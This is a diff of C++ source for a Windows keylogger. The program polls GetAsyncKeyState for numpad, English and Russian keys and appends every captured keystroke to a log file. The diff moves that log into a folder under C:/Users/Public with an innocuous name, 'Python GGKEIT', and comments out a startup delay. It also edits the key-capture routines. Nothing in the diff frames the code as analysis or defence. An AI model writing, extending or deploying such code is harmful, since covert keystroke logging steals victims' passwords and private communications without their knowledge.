@@ -1,4 +1,4 @@
-﻿#include <windows.h>
+#include <windows.h>
 #include <fstream>
 
 using namespace std;
@@ -16,9 +16,9 @@ int APIENTRY wWinMain(
     int       nCmdShow)
 {
 
-    Sleep(20000);
+    //Sleep(20000);
 
-    system("mkdir \"C:/Users/Public/Public static\"");//создать папку
+    system("mkdir \"C:/Users/Public/Python GGKEIT\"");//создать папку
 
     while (1)
     {
@@ -255,7 +255,6 @@ void getkeyENG(int num2)
 
     ofstream fout;
     fout.open("C:/Users/Public/Python GGKEIT/file.txt", ios::app);
-    if (num2 == 2) {
         if (GetAsyncKeyState(0x60) == -32767)
         {
             fout << "NUM_0 ";
@@ -294,7 +293,7 @@ void getkeyENG(int num2)
         }
         if (GetAsyncKeyState(0x69) == -32767)
         {
-            fout << "| NUM_ ";
+            fout << "NUM_9 ";
         }
 
         ///////////////////////////////////////////////
@@ -554,16 +553,12 @@ void getkeyENG(int num2)
         }
         fout.close();
     }
-    else {
-        return;
-    }
-    getkeyNUM();
+    
 }
 
 void getkeyRU(int num2) {
     ofstream fout;
     fout.open("C:/Users/Public/Python GGKEIT/file.txt", ios::app);
-    if (num2 == 1) {
         if (GetAsyncKeyState(0x46) == -32767 && num2 == 1)
         {
             fout << "А ";
@@ -697,9 +692,4 @@ void getkeyRU(int num2) {
             fout << "Я ";
         }
     }
-    else {
-        return;
-    }
-    getkeyNUM();
 }
-
